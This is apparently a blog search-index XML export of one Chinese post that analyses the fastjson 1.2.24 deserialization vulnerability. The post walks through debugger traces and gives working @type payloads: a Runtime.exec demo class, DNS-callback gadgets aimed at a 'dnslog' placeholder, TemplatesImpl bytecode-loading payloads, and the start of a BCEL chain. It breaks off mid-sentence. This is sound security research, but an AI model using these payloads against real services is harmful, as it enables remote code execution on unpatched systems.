<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>fastjson 1.2.24漏洞分析</title>
      <link href="/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<pre><code>  通过fastjson解析json字符串的流程得知：`@type`对应类名，通过获取`setXxx`或`set_Xxx`方法，对应`xxx`属性，先创建一个类对象，再通过invoke调用`setXxx`方法进行赋值</code></pre><h2 id="1-模拟命令执行"><a href="#1-模拟命令执行" class="headerlink" title="1. 模拟命令执行"></a>1. 模拟命令执行</h2><p>因此只需要找到一个setXxx中存在代码执行的类构造利用链，比如下面这个示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> vuln.POJO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">evilClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//恶意代码</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(name);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> vuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> vuln.POJO.evilClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc_1_2_24</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String poc = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;vuln.POJO.evilClass\&quot;,\&quot;name\&quot;:\&quot;open /System/Applications/Calculator.app\&quot;&#125;&quot;</span>;</span><br><span class="line">        evilClass object = (evilClass)JSON.parse(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666690814437-84669d06-7c15-4dd0-87af-ef70825afafd.png#averageHue=%23e8e5e2&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=368&id=u4b8a87ed&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1072&originWidth=1838&originalType=binary&ratio=1&rotation=0&showTitle=false&size=254069&status=done&style=none&taskId=ua18bf7b1-8f69-466f-93b8-a09840fe845&title=&width=631" alt="image.png"></p><h2 id="2-利用链"><a href="#2-利用链" class="headerlink" title="2. 利用链"></a>2. 利用链</h2><h3 id="2-1-DNS请求"><a href="#2-1-DNS请求" class="headerlink" title="2.1 DNS请求"></a>2.1 DNS请求</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet4Address&quot;</span>,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.InetSocketAddress&quot;</span>&#123;<span class="attr">&quot;address&quot;</span>:,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="2-1-1-java-net-Inet4Address"><a href="#2-1-1-java-net-Inet4Address" class="headerlink" title="2.1.1 java.net.Inet4Address"></a>2.1.1 java.net.Inet4Address</h4><p>直接看<code>java.net.Inet4Address</code>类，并没有找到属性值；通过调试发现，该类并没有走之前那个流程，他的<code>deserializer</code>是系统中默认就有的<br>于是查看<code>getDeserializer</code>方法，进入<code>this.derializers.get(type);</code>中，遍历所有内置映射好的类；发现其中就包括<code>java.net.Inet4Address</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666692623030-e2458c0f-8d76-4599-bdc1-4bf5703a189e.png#averageHue=%23f5f0ec&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=172&id=qeIeq&margin=%5Bobject%20Object%5D&name=image.png&originHeight=382&originWidth=1540&originalType=binary&ratio=1&rotation=0&showTitle=false&size=106228&status=done&style=none&taskId=u4a3565cb-4a4c-4abc-9795-d87726c011c&title=&width=692" alt="image.png"></p><h4 id="2-1-2-补充-内置有deserializer对应的类名"><a href="#2-1-2-补充-内置有deserializer对应的类名" class="headerlink" title="2.1.2 补充-内置有deserializer对应的类名"></a>2.1.2 补充-内置有deserializer对应的类名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">java.util.concurrent.atomic.AtomicBoolean</span><br><span class="line">com.alibaba.fastjson.JSONObject</span><br><span class="line">byte</span><br><span class="line">java.sql.Date</span><br><span class="line">java.lang.StringBuilder</span><br><span class="line">java.lang.Double</span><br><span class="line">java.sql.Timestamp</span><br><span class="line">java.lang.Cloneable</span><br><span class="line">java.lang.StackTraceElement</span><br><span class="line">java.math.BigDecimal</span><br><span class="line">boolean</span><br><span class="line">java.util.UUID</span><br><span class="line">java.net.URI</span><br><span class="line">java.util.TimeZone</span><br><span class="line">java.util.Map</span><br><span class="line">java.math.BigInteger</span><br><span class="line">java.lang.Long</span><br><span class="line">java.lang.Class</span><br><span class="line">java.io.Closeable</span><br><span class="line">[C</span><br><span class="line">java.io.File</span><br><span class="line">char</span><br><span class="line">java.net.InetSocketAddress</span><br><span class="line">double</span><br><span class="line">java.util.concurrent.atomic.AtomicLong</span><br><span class="line">java.io.Serializable</span><br><span class="line">com.alibaba.fastjson.JSONPath</span><br><span class="line">java.util.concurrent.ConcurrentHashMap</span><br><span class="line">java.util.concurrent.atomic.AtomicReference</span><br><span class="line">java.lang.Integer</span><br><span class="line">java.util.Date</span><br><span class="line">java.util.ArrayList</span><br><span class="line">java.util.Locale</span><br><span class="line">java.lang.Boolean</span><br><span class="line">java.lang.Number</span><br><span class="line">java.util.List</span><br><span class="line">java.util.Currency</span><br><span class="line">java.net.Inet6Address</span><br><span class="line">java.lang.Short</span><br><span class="line">java.util.concurrent.atomic.AtomicLongArray</span><br><span class="line">java.util.concurrent.ConcurrentMap</span><br><span class="line">java.net.Inet4Address</span><br><span class="line">java.util.Collection</span><br><span class="line">java.util.Calendar</span><br><span class="line">java.lang.ref.SoftReference</span><br><span class="line">int</span><br><span class="line">javax.xml.datatype.XMLGregorianCalendar</span><br><span class="line">java.util.regex.Pattern</span><br><span class="line">java.net.InetAddress</span><br><span class="line">short</span><br><span class="line">java.util.concurrent.atomic.AtomicInteger</span><br><span class="line">com.alibaba.fastjson.JSONArray</span><br><span class="line">java.nio.charset.Charset</span><br><span class="line">java.util.LinkedHashMap</span><br><span class="line">java.util.TreeMap</span><br><span class="line">long</span><br><span class="line">java.lang.StringBuffer</span><br><span class="line">java.lang.Comparable</span><br><span class="line">java.text.SimpleDateFormat</span><br><span class="line">float</span><br><span class="line">java.sql.Time</span><br><span class="line">java.lang.ref.WeakReference</span><br><span class="line">java.lang.String</span><br><span class="line">java.util.HashMap</span><br><span class="line">java.lang.Character</span><br><span class="line">java.lang.Byte</span><br><span class="line">java.lang.Object</span><br><span class="line">java.lang.Float</span><br><span class="line">java.util.concurrent.atomic.AtomicIntegerArray</span><br><span class="line">java.net.URL</span><br></pre></td></tr></table></figure><p>获取到的类为<code>MiscCodec</code>，因此反序列化的方法在 <code>com.alibaba.fastjson.serializer#deserialze</code>中</p><ul><li>如下图中，当类是<code>InetSocketAddress</code>时，会单独处理</li><li>会判断参数是否为<code>val</code>，然后进入<code>parse.parse()</code>解析流程</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666693058473-a80b1426-fa22-4059-85b7-3a5740ee442d.png#averageHue=%23f7f6f4&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=508&id=ub940bae6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1538&originWidth=2046&originalType=binary&ratio=1&rotation=0&showTitle=false&size=434071&status=done&style=none&taskId=u99ec2222-8205-4d95-a446-4df0e4e4a1f&title=&width=676" alt="image.png"><br>如图，在解析过程中，判断了类的类型，进入<code>InetAddress.getName(strVal)</code>中<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666747762762-b1b03c96-dc7c-4c03-a18f-be7b8dd2d871.png#averageHue=%23f6f4f1&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=472&id=u3848ae80&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1504&originWidth=1990&originalType=binary&ratio=1&rotation=0&showTitle=false&size=410878&status=done&style=none&taskId=uc92e1f69-5cb9-4392-9822-85ef84f9053&title=&width=625" alt="image.png"></p><h4 id="2-1-2-补充-Inet4Address解析域名"><a href="#2-1-2-补充-Inet4Address解析域名" class="headerlink" title="2.1.2 补充-Inet4Address解析域名"></a>2.1.2 补充-Inet4Address解析域名</h4><p>a. <code>InetAddress.getAllByName</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666748204892-915289b5-b995-4698-b19a-09dc152ce245.png#clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=244&id=ufdded8a1&margin=%5Bobject%20Object%5D&name=image.png&originHeight=694&originWidth=1884&originalType=binary&ratio=1&rotation=0&showTitle=false&size=171920&status=done&style=none&taskId=ucc98d2bc-a599-4249-a785-f0917618cd2&title=&width=662" alt="image.png"><br>b. 判断是否为IP地址<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666748276936-1352d674-0248-40bd-a14e-c6f1ec2cbeb1.png#clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=518&id=ud070774d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1380&originWidth=1800&originalType=binary&ratio=1&rotation=0&showTitle=false&size=269788&status=done&style=none&taskId=ue8ad5a3d-44db-4f98-90a0-a1add378e5f&title=&width=676" alt="image.png"><br>c. 判断cache中是否有缓存的域名解析地址，如果没有，则通过<code>getAddressesFromNameService</code>解析<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666748335300-3037b79a-409d-42be-ad92-eb71d7200940.png#clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=567&id=u9665bff3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1442&originWidth=1752&originalType=binary&ratio=1&rotation=0&showTitle=false&size=248737&status=done&style=none&taskId=ue3d244c0-6233-48b0-acb6-723e5336cf1&title=&width=689" alt="image.png"><br>d. 接下来<code>lookupAllHostAddr</code>中就是一些解析域名的操作，先不跟入了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666748593490-4dd25a55-88ed-474f-9a34-0ff49b47db11.png#clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=874&id=uc9be80ed&margin=%5Bobject%20Object%5D&name=image.png&originHeight=2154&originWidth=1670&originalType=binary&ratio=1&rotation=0&showTitle=false&size=322005&status=done&style=none&taskId=ua2e3b849-110b-47fd-9193-687856daf98&title=&width=678" alt="image.png"></p><h4 id="2-1-4-java-net-URL"><a href="#2-1-4-java-net-URL" class="headerlink" title="2.1.4 java.net.URL"></a>2.1.4 java.net.URL</h4><p>查看<code>MiscCodec</code>反序列化工具类，针对URL类的实例化处理只是<code>new URL</code>，那怎么触发DNS请求呢<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666750600101-7779306b-e157-4fd6-8cdd-ed1bd323ec4f.png#averageHue=%23fbf9f8&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=338&id=u43c7ed76&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1034&originWidth=2108&originalType=binary&ratio=1&rotation=0&showTitle=false&size=195649&status=done&style=none&taskId=u185e34cc-e07e-4296-bb1b-a01df7f9ea8&title=&width=689" alt="image.png"><br><strong>没有思路的时候，可能是因为没有将反序列化流程完全分析到</strong></p><ul><li>首先在创建<code>DefaultJSONParser</code>时，将Set取出，并指定对应的token值</li><li>然后在paser方法时，进入指定的<code>SET</code>分支，进入<code>parseArray</code>方法</li><li>其中<code>[]</code>中<code>@type</code>对应的解析方法和之前一样是<code>parseObject(object, i);</code></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666750723449-dd10de0d-0778-4b85-93f9-a8d627e5c3c6.png#averageHue=%23f8f4f3&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=552&id=u002841f6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1104&originWidth=1680&originalType=binary&ratio=1&rotation=0&showTitle=false&size=273276&status=done&style=none&taskId=u783b844b-1a48-4be6-9f09-49705a614df&title=&width=840" alt="image.png"><br>完成<code>@type</code>的反序列化操作后，进行<code>HashSet.add</code>操作<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666752167049-7b8c7f78-f98d-40dd-96e9-45e54dc3adb7.png#averageHue=%23f9f5f3&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=373&id=u70cd5a59&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1050&originWidth=1316&originalType=binary&ratio=1&rotation=0&showTitle=false&size=167125&status=done&style=none&taskId=u598ebc93-c3cc-4ac2-8c31-644fe3778a8&title=&width=467" alt="image.png"><br><code>HashSet.add</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666752197691-02b90c9d-2f0a-4794-9739-4ff1e3242bef.png#averageHue=%23eae9d0&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=255&id=u482a3866&margin=%5Bobject%20Object%5D&name=image.png&originHeight=510&originWidth=914&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75038&status=done&style=none&taskId=u1f516c5f-9544-48b2-a535-cfb00e9a863&title=&width=457" alt="image.png"><br><code>HashMap.put</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666752211795-651dc0a8-e875-4f2f-985c-eee808b3e705.png#averageHue=%23e8e0c6&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=255&id=ud2457aae&margin=%5Bobject%20Object%5D&name=image.png&originHeight=608&originWidth=2066&originalType=binary&ratio=1&rotation=0&showTitle=false&size=177182&status=done&style=none&taskId=ue9afae23-3381-42ec-ab45-a080a91e84c&title=&width=865" alt="image.png"><br><code>key(java.net.URL对象).hashCode()</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666752227138-347d8a5f-227b-4de6-825b-441ab7136101.png#averageHue=%23eaddc3&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=312&id=u2811f769&margin=%5Bobject%20Object%5D&name=image.png&originHeight=624&originWidth=1334&originalType=binary&ratio=1&rotation=0&showTitle=false&size=147910&status=done&style=none&taskId=u67e2cb60-64be-4a85-92a4-fcdfbd1333b&title=&width=667" alt="image.png"><br>这里就执行到<code>java.net.URL.hashCode</code>方法，这样就触发了域名解析；记得不太清楚了，似乎和<code>readObject</code>反序列化中的<code>URLDNS</code>利用链相似<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666752368256-74bbd007-71a7-4f5b-8c28-a3e74bff5be9.png#averageHue=%23fafaf8&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=423&id=u4b38f00e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1096&originWidth=1774&originalType=binary&ratio=1&rotation=0&showTitle=false&size=181077&status=done&style=none&taskId=u46a2c035-ac1a-4b41-ada8-d4bddbd638d&title=&width=684" alt="image.png"><br>由于整个解析流程，类似于流式结构，因此没有最后一个<code>]</code>闭合<code>Set</code>也是可以的</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;&#125;</span><br></pre></td></tr></table></figure><p>同理，还有两个使用<code>parseArray</code>的解析流程，参照<code> com.alibaba.fastjson.parser.JSONLexerBase#nextToken</code>及<code>scanIdent</code>方法，对应<code>TreeSet</code> 和 []，但是他们对应的是<code>TreeSet</code>和<code>JSONArray</code>；如TreeSet的add方法，会执行<code>Compara</code>方法，需要实现<code>Comparable</code>类，并运行<code>Comparable.compareTo</code>方法，这里想到了<code>readObject CB</code>利用链，暂时放着。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666752769247-1bc88dac-013e-4488-a091-28d84254f9e1.png#averageHue=%23f8f0ee&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=471&id=uc2ef2003&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1072&originWidth=1362&originalType=binary&ratio=1&rotation=0&showTitle=false&size=236263&status=done&style=none&taskId=u325a6b67-d80b-4435-bfb4-380a3e8ce2a&title=&width=598" alt="image.png"></p><h4 id="2-1-5-poc构造"><a href="#2-1-5-poc构造" class="headerlink" title="2.1.5 poc构造"></a>2.1.5 poc构造</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.InetAddress&quot;</span>,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet4Address&quot;</span>,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet6Address&quot;</span>,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.InetSocketAddress&quot;</span>&#123;<span class="attr">&quot;address&quot;</span>:,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;&#125;]</span><br></pre></td></tr></table></figure><h3 id="2-2-TemplatesImpl利用链"><a href="#2-2-TemplatesImpl利用链" class="headerlink" title="2.2 TemplatesImpl利用链"></a>2.2 TemplatesImpl利用链</h3><h4 id="2-2-1-注意私有字段的赋值"><a href="#2-2-1-注意私有字段的赋值" class="headerlink" title="2.2.1 注意私有字段的赋值"></a>2.2.1 注意私有字段的赋值</h4><p>默认通过反射进行复制是不能使用私有字段的，此时需要在反序列化时加上<code>Feature.SupportNonPublicField</code>，因此这种利用链不一定在所有的场景都可以用<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666769390586-628e5e5f-82f7-49b7-b403-0ee40108e2f4.png#averageHue=%23f6f6f5&clientId=u91088b5a-7e13-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=467&id=u1fef1989&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1566&originWidth=2312&originalType=binary&ratio=1&rotation=0&showTitle=false&size=451166&status=done&style=none&taskId=u7ebb3d14-149e-47e3-9c4e-57d764ecffa&title=&width=689" alt="image.png"></p><h4 id="2-2-2-数组类型的变量"><a href="#2-2-2-数组类型的变量" class="headerlink" title="2.2.2 数组类型的变量"></a>2.2.2 数组类型的变量</h4><p>当字段值为数组类型时，使用的是<code>ObjectArrayCodec</code>这个类作为反序列化工具类<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666773548750-2d8ad966-6b26-4287-b8e4-59ce83b89d77.png#averageHue=%23f4f3ef&clientId=u769790c2-fea5-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=390&id=ub45859b9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1240&originWidth=2104&originalType=binary&ratio=1&rotation=0&showTitle=false&size=461319&status=done&style=none&taskId=u3f74f68d-4c3c-4095-b6df-909c9aa9b14&title=&width=662" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666773590685-71aed2ab-46fa-4ef4-80b5-380bbf76531d.png#averageHue=%23f6f6f1&clientId=u769790c2-fea5-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=515&id=u81951b27&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1420&originWidth=2562&originalType=binary&ratio=1&rotation=0&showTitle=false&size=538804&status=done&style=none&taskId=u99ac6d72-cf24-4925-b2bd-8af8ca986b1&title=&width=929" alt="image.png"><code>base64解码</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666773618134-41ae335b-7d7c-467c-9b63-23896e5d0682.png#averageHue=%23f6f5f0&clientId=u769790c2-fea5-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=470&id=ua9892fb2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1510&originWidth=2654&originalType=binary&ratio=1&rotation=0&showTitle=false&size=584282&status=done&style=none&taskId=ue3978a40-270d-424b-be92-a9393c513b3&title=&width=826" alt="image.png"><br>通过序列化去写入一个<code>byte[]</code>字段值也可以看到<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666774215340-3656768c-dd50-43cb-904d-bba9fd92a99f.png#averageHue=%23fbfbfb&clientId=u769790c2-fea5-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=379&id=uc17e5a91&margin=%5Bobject%20Object%5D&name=image.png&originHeight=758&originWidth=1900&originalType=binary&ratio=1&rotation=0&showTitle=false&size=218781&status=done&style=none&taskId=ue4e6c165-9675-4794-ae63-b9f63abc01f&title=&width=950" alt="image.png"><br>因此，这个poc最大的限制在于，目标在反序列化时，是否配置允许私有字段的属性，即指定<code>Feature.SupportNonPublicField</code> ,如果这项没有指定，那么也就不能使用了；</p><h4 id="2-2-3-getOutputProperties"><a href="#2-2-3-getOutputProperties" class="headerlink" title="2.2.3 getOutputProperties"></a>2.2.3 getOutputProperties</h4><p>这里再提一下，这个poc的触发点，是这个方法；在之前分析fastjson反序列化流程时，对于getXXX方法也是会提取的，前提是getXXX的方法是没有传参的；</p><h4 id="2-2-4-结合CB利用链的新思路"><a href="#2-2-4-结合CB利用链的新思路" class="headerlink" title="2.2.4 结合CB利用链的新思路"></a>2.2.4 结合CB利用链的新思路</h4><p>记录一个思路： {“@type”:”org.apache.commons.beanutils.BeanComparator”,”comparator”:{“@type”:”org.apache.commons.collections.comparators.ComparableComparator”},”property”:”outputProperties”}<br>通过<code>TreeSet</code>触发反序列化，这个看看后续能不能用</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="attr">&quot;_bytecodes&quot;</span>:[<span class="string">&quot;xxxxxxx&quot;</span>],<span class="attr">&quot;_name&quot;</span>:<span class="string">&quot;a.b&quot;</span>,<span class="attr">&quot;_tfactory&quot;</span>:&#123;&#125;,<span class="attr">&quot;_outputProperties&quot;</span>:&#123; &#125;,<span class="attr">&quot;_version&quot;</span>:<span class="string">&quot;1.0&quot;</span>,<span class="attr">&quot;allowedProtocols&quot;</span>:<span class="string">&quot;all&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="attr">&quot;_bytecodes&quot;</span>: <span class="string">&quot;xxxxxxx&quot;</span>,<span class="attr">&quot;_name&quot;</span>:<span class="string">&quot;p&quot;</span>,<span class="attr">&quot;_tfactory&quot;</span>:&#123;&#125;,<span class="attr">&quot;_outputProperties&quot;</span>:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li><p>这里类加载的部分就不说了，参考之前反序列化中分析<code>TemplatesImpl</code>的步骤，这里触发类的实例化的地方在<code>getOutputProperties()</code></p><h3 id="2-3-BCEL利用链"><a href="#2-3-BCEL利用链" class="headerlink" title="2.3 BCEL利用链"></a>2.3 BCEL利用链</h3><h4 id="2-3-1-BasicDataSource关键类"><a href="#2-3-1-BasicDataSource关键类" class="headerlink" title="2.3.1 BasicDataSource关键类"></a>2.3.1 BasicDataSource关键类</h4><p>关键类：<code>org.apache.tomcat.dbcp.dbcp.BasicDataSource</code><br>如图，在createConnectionFactory方法调用了<code>Class.forName</code>，其中<code>driverClassName</code>和<code>driverClassLoader</code>两个私有参数都有对应的Set方法，因此是可控的<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666841736175-aa39e69a-01db-41c1-9e62-6e9dde7459be.png#averageHue=%23faf8f6&clientId=ua4aa9c72-4c8e-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=688&id=ucae1556a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1376&originWidth=2668&originalType=binary&ratio=1&rotation=0&showTitle=false&size=504041&status=done&style=none&taskId=ufa387ade-d668-44b4-9ce5-4c77e2627cc&title=&width=1334" alt="image.png"></p></li><li><p>追踪一下<code>createConnectionFactory</code> 的调用链   </p></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666841994159-4ce07368-b6ca-42e0-81bd-3550765ec97e.png#averageHue=%23f6f6f6&clientId=ua4aa9c72-4c8e-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=112&id=ub0b1a474&margin=%5Bobject%20Object%5D&name=image.png&originHeight=224&originWidth=1184&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29653&status=done&style=none&taskId=u154703f9-f853-4580-88e1-3f8245eba27&title=&width=592" alt="image.png"><br><strong>此时出现一个问题</strong>：<br>反序列化类的<code>get</code>方法的调用问题，之前的分析流程中<code>getXXX</code>方法会被提取，其中<code>FieldInfo</code>中<code>propertyName</code>是分割<code>getXXX</code>而来，因此不需要必须有对应的字段；<br>但是直接使用<code>JSON.parse(String 